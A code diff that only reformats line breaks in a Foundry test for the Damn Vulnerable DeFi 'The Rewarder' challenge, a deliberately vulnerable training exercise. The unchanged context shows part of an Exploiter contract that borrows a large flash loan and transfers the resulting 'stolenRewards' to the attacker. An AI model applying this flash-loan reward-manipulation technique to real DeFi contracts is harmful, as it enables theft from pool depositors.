@@ -5,13 +5,10 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
-import {TheRewarderPool} from
-    "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
+import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
-import {AccountingToken} from
-    "../../../src/Contracts/the-rewarder/AccountingToken.sol";
-import {FlashLoanerPool} from
-    "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
+import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1000000e18;
@@ -61,9 +58,7 @@ contract TheRewarder is Test {
             vm.startPrank(users[i]);
             dvt.approve(address(theRewarderPool), USER_DEPOSIT);
             theRewarderPool.deposit(USER_DEPOSIT);
-            assertEq(
-                theRewarderPool.accToken().balanceOf(users[i]), USER_DEPOSIT
-            );
+            assertEq(theRewarderPool.accToken().balanceOf(users[i]), USER_DEPOSIT);
             vm.stopPrank();
         }
 
@@ -116,15 +111,13 @@ contract TheRewarder is Test {
             // Users should get negligible rewards this round
             vm.prank(users[i]);
             theRewarderPool.distributeRewards();
-            uint256 rewardPerUser =
-                theRewarderPool.rewardToken().balanceOf(users[i]);
+            uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(users[i]);
             uint256 delta = rewardPerUser - 25e18;
             assertLt(delta, 1e16);
         }
         // Rewards must have been issued to the attacker account
         assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
-        uint256 rewardAttacker =
-            theRewarderPool.rewardToken().balanceOf(attacker);
+        uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(attacker);
 
         // The amount of rewards earned should be really close to 100 tokens
         uint256 deltaAttacker = 100e18 - rewardAttacker;
@@ -140,11 +133,7 @@ contract Exploiter {
     TheRewarderPool internal theRewarderPool;
     DamnValuableToken internal dvt;
 
-    constructor(
-        FlashLoanerPool _flpool,
-        TheRewarderPool _trpool,
-        DamnValuableToken _dvt
-    ) {
+    constructor(FlashLoanerPool _flpool, TheRewarderPool _trpool, DamnValuableToken _dvt) {
         flashLoanerPool = _flpool;
         theRewarderPool = _trpool;
         dvt = _dvt;
@@ -154,8 +143,7 @@ contract Exploiter {
 
     function attack() external {
         flashLoanerPool.flashLoan(1000000e18);
-        uint256 stolenRewards =
-            theRewarderPool.rewardToken().balanceOf(address(this));
+        uint256 stolenRewards = theRewarderPool.rewardToken().balanceOf(address(this));
         theRewarderPool.rewardToken().transfer(msg.sender, stolenRewards);
     }
 
